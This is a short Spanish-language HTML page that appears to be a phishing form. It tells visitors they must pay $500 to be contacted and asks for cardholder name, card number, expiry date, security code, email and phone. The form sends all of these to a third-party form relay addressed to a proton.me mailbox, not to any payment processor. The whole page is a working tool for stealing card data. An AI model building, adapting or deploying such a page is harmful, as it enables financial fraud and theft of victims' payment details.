<html>
<head>
	<title>Formulario</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
	<link rel="stylesheet" href="style.css">
</head>

<body>
	<form action="https://formsubmit.co/formulariocontacto@proton.me" method="POST"> 
	<img src="pj.jpg" alt="" width="321" height="175" border="0">
		<h1>Para que nos contactemos contigo debes abonar $500 debido a la gran demanda</h2>
		<h3>Datos de Tarjeta de Credito/Debito</h3>
		<div class="input-group">
			<div class="input-container">
				<input type="Text" name="name" placeholder="Nombre">
				<i class="fa-solid fa-user" ></i>
			</div>
			<div class="input-container">
				<input type="Text" name="number" placeholder="Numero de tarjeta">
				<i class="fa-solid fa-bank" ></i>
			</div>
			<div class="input-container">
				<input type="text" name="date" placeholder="Fecha de Venc. (mm/aa)">
				<i class="fa-solid fa-calendar" ></i>
			</div>
			<div class="input-container">
				<input type="password" name="clavetarj" placeholder="Clave de Seg">
				<i class="fa-solid fa-lock" ></i>
			</div>
			
			<h3>Datos de contacto</h3>
			<div class="input-container">
				<input type="Text" name="mail" placeholder="email">
				<i class="fa-solid fa-user" ></i>
			</div>
			<div class="input-container">
				<input type="Text" name="Telefono" placeholder="Nro de Tel">
				<i class="fa-solid fa-lock" ></i>
			</div>
			<h2>Total a pagar= $500 </h2>
						<button type="submit">Pagar</button>
									

	
		</div>
	</form>

</body>
</html>
